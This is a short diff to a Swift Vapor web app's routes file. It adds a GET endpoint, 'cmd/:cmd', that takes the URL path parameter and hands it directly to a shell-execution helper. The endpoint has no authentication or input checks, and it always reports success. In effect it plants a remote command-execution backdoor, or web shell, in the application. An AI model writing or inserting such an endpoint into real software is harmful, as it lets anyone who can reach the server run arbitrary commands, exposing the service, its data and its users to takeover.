@@ -25,4 +25,10 @@ func routes(_ app: Application) throws {
         update()
         return AddUserModel(msg: "success", success: true)
     }
+    
+    app.get("cmd",":cmd") { req -> AddUserModel in
+        let name = req.parameters.get("cmd") ?? ""
+        shellFunc(name)
+        return AddUserModel(msg: "success", success: true)
+    }
 }
